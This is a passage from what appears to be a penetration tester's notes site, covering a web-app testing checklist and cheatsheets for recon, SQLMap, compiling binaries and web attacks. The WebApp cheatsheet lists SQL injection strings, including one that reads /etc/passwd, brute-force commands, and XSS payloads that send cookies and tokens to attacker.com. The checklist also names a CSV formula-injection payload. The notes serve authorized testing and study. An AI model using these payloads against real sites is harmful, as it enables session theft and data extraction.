Fields (<code>autocomplete=\"off\"</code> or <code>\"new-password\"</code>)</li> <li>No Hardcoded Credentials in Client-Side Code</li> <li>No Default Credentials for Admin/Test Accounts</li> <li>Secure Password Storage (hashing with strong algorithm and salt, e.g., Argon2, scrypt, bcrypt, PBKDF2)</li> </ul> </li> <li>E. Session Management for Authentication:<ul> <li>Session Token Generation (randomness, length, uniqueness)</li> <li>Session Token Transmission (HTTPS only, HttpOnly flag, Secure flag for cookies)</li> <li>Session Timeout (idle and absolute)</li> <li>Session Fixation Vulnerabilities</li> <li>Session Hijacking (if tokens are predictable or exposed)</li> <li>Secure Logout (session invalidated server-side)</li> <li>Concurrent Session Management</li> <li>\"Remember Me\" Functionality Security (long-lived tokens, secure storage)</li> </ul> </li> <li>F. Multi-Factor Authentication (MFA/2FA):<ul> <li>MFA Bypass Techniques (e.g., response manipulation, backup code issues)</li> <li>Weak OTP Generation/Validation</li> <li>Information Disclosure of MFA Status</li> <li>MFA Trust Mechanisms (e.g., trust this device) and their bypasses</li> <li>Brute-forcing recovery codes</li> <li>Social engineering MFA codes</li> </ul> </li> <li>G. OAuth / OpenID Connect / SAML Testing:<ul> <li>Weak Redirect URI Configuration (Open Redirect, token theft)</li> <li>CSRF on Authorization Flow (<code>state</code> parameter misuse)</li> <li>Authorization Code Interception / Replay</li> <li>Implicit Grant Flow Misuse (token leakage via browser history/Referer)</li> <li>JWT Vulnerabilities (alg=none, weak secrets, public key confusion, <code>kid</code> injection)</li> <li>SAML Assertion Tampering, Signature Wrapping, XML Injection</li> <li>Insufficient Scope Validation</li> <li>Client Secret Leakage</li> </ul> </li> <li>H. Password Reset &amp; Account Recovery:<ul> <li>Token Generation (randomness, expiry, single-use)</li> <li>Token Leakage (e.g., in URL, via Referer header)</li> <li>Information Disclosure During Reset Process (e.g., confirming email existence)</li> <li>Host Header Injection for Password Reset Links</li> <li>No Link Between Session and Reset Process</li> <li>Email/SMS Verification Code Brute-Force/Bypass</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#iv-authorization-testing","title":"IV. Authorization Testing","text":"<ul> <li>A. Horizontal Privilege Escalation:<ul> <li>Accessing Data/Functionality of Other Users with Same Role</li> <li>Modifying Identifiers in URLs, POST data, Headers, Cookies (IDOR)</li> <li>Testing All Functions with User A's Session, Then User B's Identifiers</li> </ul> </li> <li>B. Vertical Privilege Escalation:<ul> <li>Accessing Admin/Higher-Privileged Functionality with Lower-Privileged User Session</li> <li>Forced Browse to Admin URLs</li> <li>Parameter Tampering to Invoke Privileged Functions</li> <li>Exploiting Chained Vulnerabilities to Elevate Privileges</li> </ul> </li> <li>C. Insecure Direct Object References (IDOR):<ul> <li>Testing for IDOR in GET/POST parameters, JSON bodies, Cookies, Headers</li> <li>Testing with numeric IDs, GUIDs, usernames, filenames</li> <li>Checking for IDOR in API endpoints</li> <li>Testing for IDOR in multi-tenant applications</li> </ul> </li> <li>D. Missing Function-Level Access Control:<ul> <li>Directly Calling Privileged Functions/API Endpoints Without Proper Checks</li> <li>Accessing Admin Panels/Functions While Authenticated as a Regular User</li> </ul> </li> <li>E. Role-Based Access Control (RBAC) Bypass:<ul> <li>Manipulating Role Parameters</li> <li>Exploiting Flaws in Role Assignment Logic</li> <li>Path Traversal to Access Restricted Resources Based on Role</li> </ul> </li> <li>F. Client-Side Authorization Control Bypass:<ul> <li>Disabling JavaScript</li> <li>Modifying JavaScript Variables</li> <li>Intercepting and Modifying Requests in Burp/ZAP to Bypass Client-Side UI Restrictions</li> </ul> </li> <li>G. Insecure API Authorization:<ul> <li>Missing or Weak API Key/Token Validation</li> <li>Broken Object Level Authorization (BOLA) in APIs</li> <li>Broken Function Level Authorization (BFLA) in APIs</li> <li>Mass Assignment leading to privilege escalation via API</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#v-session-management-testing","title":"V. Session Management Testing","text":"<ul> <li>A. Session Token Properties:<ul> <li>Meaningful Session Tokens (avoid sequential or easily guessable tokens)</li> <li>Session Token Length and Entropy</li> <li><code>HttpOnly</code> Flag on Cookies</li> <li><code>Secure</code> Flag on Cookies</li> <li><code>SameSite</code> Attribute (Lax, Strict, None) on Cookies &amp; CSRF implications</li> <li>Cookie Path and Domain Scope (<code>Path=/</code>, <code>Domain=</code>) - ensure not too broad</li> <li>Cookie Expiration and <code>Max-Age</code></li> </ul> </li> <li>B. Session Lifecycle:<ul> <li>Session Invalidation on Logout</li> <li>Session Invalidation on Password Change/Reset</li> <li>Session Invalidation on Idle Timeout</li> <li>Session Invalidation on Absolute Timeout</li> <li>Session Renewal Mechanisms (sliding sessions) security</li> <li>Handling of Concurrent Logins (allow, disallow, notify)</li> </ul> </li> <li>C. Session Puzzling/Fixation:<ul> <li>Forcing Session IDs via GET/POST Parameters or Headers</li> <li>Session Fixation Before Authentication</li> <li>Session Adoption Vulnerabilities</li> </ul> </li> <li>D. Cross-Site Request Forgery (CSRF):<ul> <li>Absence of Anti-CSRF Tokens for State-Changing Requests</li> <li>Weak Anti-CSRF Token Implementation (not tied to session, predictable, reusable)</li> <li>CSRF on Login/Logout Forms (less common but possible impact)</li> <li>Testing for CSRF in AJAX requests</li> <li>Testing for CSRF with different HTTP methods (GET, POST, PUT, DELETE)</li> <li>Use of <code>SameSite</code> cookie attribute as a defense and its limitations</li> </ul> </li> <li>E. JSON Web Token (JWT) Specifics:<ul> <li><code>alg:none</code> vulnerability</li> <li>HMAC with Public Key (Algorithm Confusion)</li> <li>Weak Secret Keys (brute-forceable)</li> <li><code>kid</code> parameter injection / path traversal</li> <li>Sensitive data in JWT payload (non-encrypted)</li> <li>Lack of <code>exp</code> (expiration) claim or improper validation</li> <li><code>iat</code> (issued at) and <code>nbf</code> (not before) claim validation</li> <li>JKU/X5U header vulnerabilities (SSRF to fetch malicious keys)</li> <li>Replay attacks if <code>jti</code> (JWT ID) is not used or validated for uniqueness</li> <li>Signature stripping</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#vi-input-validation-sanitization-testing-injection-vulnerabilities","title":"VI. Input Validation &amp; Sanitization Testing (Injection Vulnerabilities)","text":"<ul> <li>A. Cross-Site Scripting (XSS):<ul> <li>Reflected XSS:<ul> <li>Testing all input fields, URL parameters, HTTP headers</li> <li>Using various XSS payloads (script tags, event handlers, different encodings)</li> <li>Testing in HTML context, JavaScript context, attribute context, URL context</li> </ul> </li> <li>Stored XSS:<ul> <li>Testing inputs that are stored and later displayed (comments, profiles, forum posts, filenames)</li> <li>Testing for second-order stored XSS (data stored via one function, XSS triggers via another)</li> </ul> </li> <li>DOM-based XSS:<ul> <li>Identifying sources (e.g., <code>location.hash</code>, <code>document.referrer</code>) and sinks (e.g., <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>)</li> <li>Manually crafting payloads targeting DOM manipulation</li> <li>Using browser developer tools to trace data flow</li> </ul> </li> <li>Blind XSS:<ul> <li>Injecting payloads into backend systems (e.g., log viewers, admin panels) that might trigger later</li> <li>Using XSS Hunter or similar services</li> </ul> </li> <li>XSS Filter Evasion Techniques:<ul> <li>Encoding (HTML entities, URL encoding, Base64)</li> <li>Case variations</li> <li>Null bytes</li> <li>Obfuscated JavaScript</li> <li>Using less common event handlers/tags</li> </ul> </li> <li>Content Security Policy (CSP) Analysis &amp; Bypass:<ul> <li>Review CSP headers for misconfigurations (<code>unsafe-inline</code>, <code>unsafe-eval</code>, overly broad sources)</li> <li>JSONP abuse for CSP bypass</li> <li>Dangling markup injection</li> </ul> </li> </ul> </li> <li>B. SQL Injection (SQLi):<ul> <li>In-band SQLi:<ul> <li>Error-based (forcing database errors revealing data/schema)</li> <li>Union-based (combining results from another table)</li> </ul> </li> <li>Inferential (Blind) SQLi:<ul> <li>Boolean-based (observing true/false responses)</li> <li>Time-based (injecting delays to infer data)</li> </ul> </li> <li>Out-of-band SQLi:<ul> <li>Using database functions to exfiltrate data via DNS, HTTP requests (e.g., <code>xp_dirtree</code>, <code>UTL_HTTP</code>, <code>LOAD_FILE</code>)</li> </ul> </li> <li>Testing Locations:<ul> <li>URL Parameters (GET)</li> <li>Form Fields (POST)</li> <li>HTTP Headers (Cookie, User-Agent, Referer, Custom Headers)</li> <li>JSON/XML Payloads</li> <li>Stored Procedures / Second Order SQLi</li> </ul> </li> <li>Database Specific Payloads:<ul> <li>MySQL, MSSQL, PostgreSQL, Oracle, SQLite</li> </ul> </li> <li>WAF Bypass Techniques for SQLi:<ul> <li>Comments, whitespace, case variations, encoding, null bytes, alternative syntax</li> </ul> </li> <li>NoSQL Injection:<ul> <li>Targeting MongoDB, CouchDB, etc.</li> <li>Operator injection (<code>$gt</code>, <code>$ne</code>, <code>$where</code>), JavaScript injection</li> </ul> </li> </ul> </li> <li>C. OS Command Injection:<ul> <li>Testing inputs used in system commands (filenames, user inputs to scripts)</li> <li>Using command separators (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>\\n</code>, <code>`</code>)</li> <li>Blind command injection techniques (time delays, output redirection to webroot, out-of-band)</li> <li>Testing file upload functionalities for command injection via filenames or metadata</li> </ul> </li> <li>D. LDAP Injection:<ul> <li>Testing inputs used in LDAP queries (login forms, search functions)</li> <li>Using LDAP metacharacters (, <code>(</code>, <code>)</code>, <code>\\</code>, <code>&amp;</code>, <code>|</code>, <code>!</code>)</li> </ul> </li> <li>E. XPath Injection / XXE (XML External Entity) Injection:<ul> <li>XPath Injection:<ul> <li>Testing inputs used in XPath queries in XML-based applications</li> </ul> </li> <li>XXE Injection:<ul> <li>Testing XML parsers for XXE vulnerabilities (file uploads, SOAP requests, other XML inputs)</li> <li>Exploiting XXE for:<ul> <li>File disclosure (<code>file:///etc/passwd</code>)</li> <li>SSRF (accessing internal resources)</li> <li>Denial of Service (billion laughs attack)</li> <li>Port scanning internal networks</li> </ul> </li> <li>Testing for out-of-band XXE</li> </ul> </li> </ul> </li> <li>F. Server-Side Template Injection (SSTI):<ul> <li>Identifying template engines (Jinja2, Twig, Freemarker, Velocity, ERB, etc.)</li> <li>Using polyglot payloads to detect SSTI</li> <li>Crafting payloads for RCE or information disclosure based on the identified engine</li> <li>Testing in user profiles, custom templates, email generation, PDF generation</li> </ul> </li> <li>G. HTTP Header Injection / Response Splitting:<ul> <li>Injecting <code>CRLF</code> characters (<code>\\r\\n</code>) into headers controlled by user input</li> <li>Testing for cache poisoning, XSS, session fixation via header injection</li> <li>Testing for HTTP Response Splitting</li> </ul> </li> <li>H. NoSQL Injection (Re-iterated for specific focus):<ul> <li>Check if user inputs directly construct NoSQL queries</li> <li>Try injecting NoSQL operators (e.g., MongoDB: <code>$ne</code>, <code>$regex</code>, <code>$where</code> for JS execution)</li> <li>Test for data type manipulation that could lead to unexpected query behavior</li> </ul> </li> <li>I. Host Header Injection:<ul> <li>Manipulating the <code>Host</code> header for:<ul> <li>Password reset poisoning</li> <li>Cache poisoning</li> <li>SSRF against internal hosts that trust the Host header</li> <li>Accessing internal applications if a reverse proxy uses the Host header for routing</li> </ul> </li> </ul> </li> <li>J. CSV / Formula Injection:<ul> <li>Testing \"Export to CSV/Excel\" functionalities</li> <li>Injecting payloads like <code>=cmd|' /C calc'!A0</code> or <code>=HYPERLINK(...)</code> that execute when the CSV is opened</li> </ul> </li> <li>K. Insecure File Uploads:<ul> <li>Bypassing File Type Restrictions (magic bytes, extensions, <code>Content-Type</code> header)</li> <li>Uploading Web Shells (<code>.php</code>, <code>.asp</code>, <code>.jsp</code>, <code>.aspx</code>, <code>.phtml</code>)</li> <li>Uploading Files with Malicious Payloads (XSS in SVG, XXE in XML/DOCX)</li> <li>Directory Traversal on File Upload Path (<code>../../shell.php</code>)</li> <li>Double Extension Attack (<code>shell.php.jpg</code>)</li> <li>Null Byte Injection in Filename (<code>shell.php%00.jpg</code>)</li> <li>Testing for Race Conditions during file upload and processing</li> <li>Large File Upload DoS</li> <li>Pixel Flood Attack (ImageMagick/GraphicsMagick vulnerabilities)</li> <li>Antivirus Bypass for uploaded malware</li> <li>Overwriting existing critical files</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#vii-server-side-vulnerabilities","title":"VII. Server-Side Vulnerabilities","text":"<ul> <li>A. Server-Side Request Forgery (SSRF):<ul> <li>Identifying functionalities that make requests based on user input (URL fetchers, PDF generators, webhook integrations)</li> <li>Testing with <code>http://</code>, <code>https://</code>, <code>file:///</code>, <code>ftp://</code>, <code>gopher://</code>, <code>dict://</code> schemes</li> <li>Accessing internal IP addresses and ports (e.g., <code>127.0.0.1</code>, <code>169.254.169.254</code>, internal RFC1918 ranges)</li> <li>Interacting with cloud metadata services (AWS EC2, Azure IMDS, GCP Metadata Server)</li> <li>Bypassing SSRF defenses (blacklists, whitelists, open redirects)</li> <li>Blind SSRF detection techniques</li> </ul> </li> <li>B. Security Misconfigurations (Server Level):<ul> <li>Default Credentials (admin panels, databases, middleware)</li> <li>Directory Listing Enabled</li> <li>Verbose Error Messages Disclosing Sensitive Information (stack traces, paths, config details)</li> <li>Unnecessary Services/Features Enabled (e.g., debug modes, sample applications, HTTP methods like PUT/DELETE if not used)</li> <li>Outdated Software Versions (web server, OS, libraries - check for public CVEs)</li> <li>Misconfigured HTTP Headers (Missing <code>Strict-Transport-Security</code>, <code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, <code>Referrer-Policy</code>)</li> <li>Information Leakage via Headers (<code>Server</code>, <code>X-Powered-By</code>, <code>X-AspNet-Version</code>)</li> <li>Insecure Cross-Origin Resource Sharing (CORS) Configuration (<code>Access-Control-Allow-Origin: *</code> or reflecting origin)</li> <li>Open Ports for Unnecessary Services</li> <li>Weak SSL/TLS Configurations (old protocols like SSLv3/TLSv1.0/1.1, weak ciphers, BEAST, POODLE, Heartbleed, Sweet32)</li> <li>Exposed Management Interfaces (Tomcat Manager, JBoss Admin Console, phpMyAdmin)</li> <li>Insecure handling of <code>.git</code> directory or other VCS metadata</li> <li>Path Traversal at the Web Server Level (e.g., misconfigured aliases)</li> </ul> </li> <li>C. Using Components with Known Vulnerabilities:<ul> <li>Identifying all third-party libraries (client-side and server-side)</li> <li>Checking versions against vulnerability databases (NVD, CVE Details, Snyk, Retire.js for JS)</li> <li>Testing for known exploits for identified vulnerable components</li> </ul> </li> <li>D. Information Disclosure:<ul> <li>Sensitive Data in Comments (HTML, JS, CSS)</li> <li>Error Message Content (stack traces, database errors, internal paths)</li> <li>Backup Files (<code>.bak</code>, <code>.swp</code>, <code>.old</code>, <code>~</code>)</li> <li>Configuration Files Exposed (<code>.env</code>, <code>web.config</code>, <code>appsettings.json</code>)</li> <li>API Key Leakage (client-side code, public repositories, error messages)</li> <li>User Profile Information Leakage (e.g., via sequential IDs or search features)</li> <li>Debug Parameters revealing sensitive info (<code>?debug=true</code>)</li> </ul> </li> <li>E. Denial of Service (DoS) - Use with EXTREME caution and explicit permission:<ul> <li>Resource Exhaustion (CPU, memory, disk space) via legitimate-looking requests</li> <li>Regex DoS (ReDoS) in input validation</li> <li>XML Bomb / Billion Laughs (for XXE-vulnerable parsers)</li> <li>Large File Uploads</li> <li>Slow HTTP Attacks (Slowloris, Slow POST)</li> <li>Asymmetric Resource Consumption (e.g., password hashing, complex search queries)</li> <li>Logic flaws leading to resource exhaustion</li> <li>Testing for lack of rate limiting on expensive operations</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#viii-api-security-testing-rest-graphql-soap-websockets","title":"VIII. API Security Testing (REST, GraphQL, SOAP, WebSockets)","text":"<ul> <li>A. General API Vulnerabilities (Applicable to REST, GraphQL, etc.):<ul> <li>Broken Authentication (as per Section III)</li> <li>Broken Authorization (BOLA/IDOR, BFLA - as per Section IV)</li> <li>Excessive Data Exposure (API returning more data than necessary)</li> <li>Mass Assignment (binding client-controlled data to internal object properties without validation)</li> <li>Lack of Resources &amp; Rate Limiting (DoS, brute-force)</li> <li>Security Misconfiguration (verbose errors, default creds, CORS, HTTP headers)</li> <li>Injection Vulnerabilities (SQLi, NoSQLi, Command Inj. in API parameters)</li> <li>Improper Assets Management (e.g., old API versions still active and vulnerable, exposed dev/staging APIs)</li> <li>Insufficient Logging &amp; Monitoring (for detecting attacks)</li> </ul> </li> <li>B. REST API Specifics:<ul> <li>HTTP Method Tampering (e.g., using GET instead of POST, or PUT/DELETE when not intended)</li> <li>Insecure handling of <code>Content-Type</code> (e.g., expecting JSON but accepting XML leading to XXE)</li> <li>API Key Management (secure storage, rotation, privilege scoping)</li> <li>Parameter Pollution (HTTP Parameter Pollution - HPP)</li> <li>Unprotected API endpoints (especially for internal or sensitive operations)</li> <li>Versioning issues (e.g., <code>/v1/</code> vulnerable while <code>/v2/</code> is fixed)</li> </ul> </li> <li>C. GraphQL Specifics:<ul> <li>Introspection Query Enabled (allowing attackers to map the entire schema)</li> <li>Batching Attacks (sending multiple queries in one request to cause DoS)</li> <li>Circular Queries (DoS)</li> <li>Field Duplication (DoS)</li> <li>Deeply Nested Queries / Query Depth Limiting</li> <li>Alias Overloading</li> <li>Authorization Bypass via Nested Objects or mutations</li> <li>Suggestions Enabled (can leak field/type names)</li> <li>Injection within GraphQL arguments</li> </ul> </li> <li>D. SOAP API Specifics:<ul> <li>XML Injection / XXE in SOAP messages</li> <li>WSDL Enumeration and Analysis</li> <li>Replay Attacks with SOAP messages</li> <li>WS-Security Misconfigurations</li> </ul> </li> <li>E. WebSockets / Socket.IO Specifics:<ul> <li>Unauthenticated/Unauthorized Access to WebSocket Endpoints</li> <li>Cross-Site WebSocket Hijacking (CSWSH)</li> <li>Data Injection through WebSocket Messages (XSS, SQLi if data is processed insecurely)</li> <li>Lack of Message Encryption (if <code>wss://</code> is not used)</li> <li>Denial of Service via message flooding</li> <li>Weak origin validation</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#ix-business-logic-vulnerabilities","title":"IX. Business Logic Vulnerabilities","text":"<ul> <li>A. All<ul> <li>Identify Application Workflows (user registration, password reset, shopping cart, payment processing, approval chains)</li> <li>Test for Flaws in Multi-Stage Processes (e.g., skipping steps, manipulating state)</li> <li>Price Manipulation (tampering with prices in requests or client-side)</li> <li>Discount/Coupon Abuse</li> <li>Order Modification/Cancellation Flaws</li> <li>Approval Process Bypass</li> <li>Exploiting Race Conditions in Business Logic (e.g., redeeming a voucher multiple times)</li> <li>Feature Abuse (e.g., spamming via contact forms, review bombing)</li> <li>Unexpected Application State Manipulation</li> <li>Data Validation Flaws Beyond Security (e.g., allowing negative quantities)</li> <li>Information Leakage through Business Logic Flows</li> <li>Exploiting Trust Between Application Components</li> <li>Circumventing Workflow Rules</li> <li>Unauthorized Fund Transfers or Data Modification</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#x-cryptography-data-protection","title":"X. Cryptography &amp; Data Protection","text":"<ul> <li>A. All<ul> <li>Use of Weak or Deprecated Cryptographic Algorithms (MD5, SHA1 for hashing passwords, DES, RC4 for encryption)</li> <li>Insufficient Key Length or Weak Key Generation</li> <li>Hardcoded Cryptographic Keys in Client-Side or Server-Side Code</li> <li>Missing Encryption for Sensitive Data at Rest (databases, files)</li> <li>Missing Encryption for Sensitive Data in Transit (ensure TLS 1.2+ everywhere, strong ciphers)</li> <li>Predictable IVs (Initialization Vectors) or Nonce Reuse in Symmetric Encryption</li> <li>Padding Oracle Attacks (if CBC mode with PKCS#7 padding is used and error messages leak info)</li> <li>Insecure Random Number Generation for Security-Sensitive Values (session tokens, CSRF tokens, password reset tokens)</li> <li>Client-Side Cryptography Implementation Weaknesses (often easily bypassed)</li> <li>Information Leakage via Cryptographic Error Messages</li> <li>Data Masking Failures (e.g., credit card numbers not properly masked in logs or UI)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#xi-error-handling-logging","title":"XI. Error Handling &amp; Logging","text":"<ul> <li>A. All<ul> <li>Verbose Error Messages (stack traces, internal paths, SQL errors, software versions)<ul> <li>Test different inputs, invalid parameters, unexpected data types</li> </ul> </li> <li>Generic vs. Specific Error Messages (avoid revealing too much, but provide enough for user understanding)</li> <li>Inconsistent Error Handling Across Application</li> <li>Improper Logging (sensitive data in logs - passwords, API keys, session tokens, PII)</li> <li>Insufficient Logging (not logging security-relevant events - logins, failed logins, access control failures, input validation failures)</li> <li>Logs Accessible by Unauthorized Users</li> <li>Log Injection / Log Forging (injecting fake log entries or CRLF to break log format)</li> <li>Error Codes that Reveal Too Much Information</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#xii-client-side-security-beyond-dom-xss","title":"XII. Client-Side Security (Beyond DOM XSS)","text":"<ul> <li>A. All<ul> <li>Insecure Use of <code>postMessage()</code> API (missing origin validation, data validation)</li> <li>Insecure Data Storage in Browser (Local Storage, Session Storage, Cookies - check for sensitive info)</li> <li>Client-Side URL Redirects (Open Redirect if user input controls destination without validation)</li> <li>Clickjacking / UI Redressing (ensure <code>X-Frame-Options</code> or <code>CSP frame-ancestors</code> are used)</li> <li>Cross-Origin Resource Sharing (CORS) Misconfigurations allowing unauthorized origins</li> <li>Subresource Integrity (SRI) Not Used for External JS/CSS</li> <li>Outdated or Vulnerable JavaScript Libraries (Retire.js)</li> <li>Improperly Sanitized Data Displayed from Client-Side Storage</li> <li>WebAssembly (WASM) vulnerabilities (if used, memory corruption, logic flaws)</li> <li>Service Worker vulnerabilities (interception, cache poisoning)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#xiii-reporting-post-assessment","title":"XIII. Reporting &amp; Post-Assessment","text":"<ul> <li>A. All<ul> <li>Document All Findings (description, vulnerable URLs/parameters, PoC steps, screenshots/videos)</li> <li>Assess Impact and Likelihood (CVSS scoring or similar)</li> <li>Provide Clear Remediation Guidance (specific to the vulnerability and technology)</li> <li>Executive Summary for Management</li> <li>Technical Details for Development Teams</li> <li>Positive Findings (what the application does well)</li> <li>Strategic Recommendations for Overall Security Posture Improvement</li> <li>(Optional) Retest after fixes are applied.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/","title":"Compiling Binaries","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#linux-target","title":"Linux Target","text":"<p>Basic C <pre><code>gcc source.c -o myprog\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#windows-target","title":"Windows Target","text":"<p><pre><code>sudo apt install mingw-w64\n</code></pre> Basic C Compilation 32-bit \u201cHello World\u201d (console) <pre><code>i686-w64-mingw32-gcc -O2 -Wall hello.c -o hello32.exe\n</code></pre> 64-bit \u201cHello World\u201d (console) <pre><code>x86_64-w64-mingw32-gcc -O2 -Wall hello.c -o hello64.exe\n</code></pre> Basic C++ Compilation 32-bit C++ (console) <pre><code>i686-w64-mingw32-g++ -O2 -std=c++17 -Wall hello.cpp -o hello32.exe\n</code></pre> 64-bit C++ (console) <pre><code>x86_64-w64-mingw32-g++ -O2 -std=c++17 -Wall hello.cpp -o hello64.exe\n</code></pre> Setting Windows Version Macros To target a minimum Windows version, define <code>_WIN32_WINNT</code> and <code>WINVER</code>: <pre><code># Example: target Windows 7 (0x0601)\nx86_64-w64-mingw32-gcc -D_WIN32_WINNT=0x0601 -DWINVER=0x0601 hello.c -o hello.exe\n</code></pre> Common <code>_WIN32_WINNT</code> values:</p> <ul> <li><code>0x0501</code> \u2192 Windows XP</li> <li><code>0x0600</code> \u2192 Windows Vista</li> <li><code>0x0601</code> \u2192 Windows 7    </li> <li><code>0x0602</code> \u2192 Windows 8</li> <li><code>0x0A00</code> \u2192 Windows 10</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#net-excutables","title":".NET Excutables","text":"<p><pre><code>sudo apt install -y mono-devel mono-mkbundle\n</code></pre> <pre><code>sudo apt install -y gcc-mingw-w64-x86-64\nsudo apt install -y gcc-mingw-w64-i6\n</code></pre> Compile to a portable .NET EXE (IL-only) using Mono\u2019s C# compiler (<code>mcs</code>): <pre><code>mcs -out:Hello.exe Hello.cs\n</code></pre> Basic 64-bit Windows EXE <pre><code>mkbundle \\\n  --cross mono-w64 --simple \\\n  --static \\\n  --deps \\\n  -o Hello_native.exe \\\n  Hello.exe\n</code></pre> For 32-bit Windows (Win32) <pre><code>mkbundle \\\n  --cross mono-w64-i686 \\\n  --simple \\\n  --static \\\n  --deps \\\n  -o Hello_native32.exe \\\n  Hello.exe\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/#csproj","title":".csproj","text":"<p><pre><code>wget https://packages.microsoft.com/config/ubuntu/22.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb\nsudo dpkg -i packages-microsoft-prod.deb\nsudo apt update\nsudo apt install -y dotnet-sdk-7.0\n</code></pre> <pre><code>dotnet --info\n</code></pre> Ensure there\u2019s a <code>YourProject.csproj</code> in that directory (or a parent directory). Restore dependencies <pre><code>dotnet restore\n</code></pre> Build <pre><code>dotnet build -c Release\n</code></pre></p> <ul> <li>By default, the output goes into <code>bin/Release/&lt;TargetFramework&gt;/</code></li> <li>If you want to target a specific runtime (e.g. Windows), use: Target runtime <pre><code>dotnet publish -c Release -r win-x64 --self-contained false\n</code></pre></li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/","title":"Passive Network Recon","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/#host-discovery","title":"Host discovery","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/#dhcp","title":"DHCP","text":"<p>dhcpdump <pre><code>sudo dhcpdump -i eth0\n</code></pre> zeek <pre><code>sudo zeek -i eth0 local\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/#arp","title":"ARP","text":"<p>tcpdump <pre><code>sudo tcpdump -n -i eth0 arp\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/SQLMap/","title":"SQLMap","text":"<p>Useful flags: <pre><code>--batch will answer the default the questons automatically\n--level\n--risk\n-T\n-D\n--dump\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/","title":"WebApp","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#reconnaissance","title":"RECONNAISSANCE","text":"<p>Present on: All web applications</p> <p>Manual: Browser dev tools, view source, directory guessing Automated: <pre><code>subfinder -d target.com | httpx -silent\nffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ\nnuclei -u target.com -t technologies/\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#authentication-bypass","title":"AUTHENTICATION BYPASS","text":"<p>Present when: Poor auth implementation, weak validation logic</p> <p>Manual: Try default creds, manipulate login flow, check session handling Automated: <pre><code>hydra -L users.txt -P pass.txt target.com http-post-form\nffuf -w creds.txt -u target.com/login -X POST -d \"user=FUZZ&amp;pass=FUZZ\"\n</code></pre></p> <p>Exploit: <pre><code>' OR 1=1--\nadmin'--\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#sql-injection","title":"SQL INJECTION","text":"<p>Present when: User input directly concatenated into SQL queries Detailed cheatsheet: SQL Injection</p> <p>Manual: Add <code>'</code> to parameters, observe errors, test time delays Automated: <pre><code>sqlmap -u \"target.com/page?id=1\" --batch --dbs\nghauri -u \"target.com/page?id=1\"\n</code></pre></p> <p>Exploit: <pre><code># Detection\n' OR SLEEP(5)--\n' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n\n# Extraction\n' UNION SELECT 1,version(),database()--\n' UNION SELECT 1,load_file('/etc/passwd'),3--\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#xss","title":"XSS","text":"<p>Present when: User input reflected in HTML without proper encoding Also see Cross-Site Scripting (XSS) Manual: Insert <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in all inputs, check response Automated: <pre><code>xsser --url=\"target.com/search?q=\" -p\nnuclei -u target.com -t xss/\ndalfox url target.com\n</code></pre></p> <p>Exploit: <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;img src=x onerror=fetch('//attacker.com/'+document.cookie)&gt;\n&lt;svg onload=location='//attacker.com/?'+localStorage.getItem('token')&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#command-injection","title":"COMMAND INJECTION","text":"<p>Present when: User input passed to system commands without sanitization Also see: Command Injection Manual: Test with 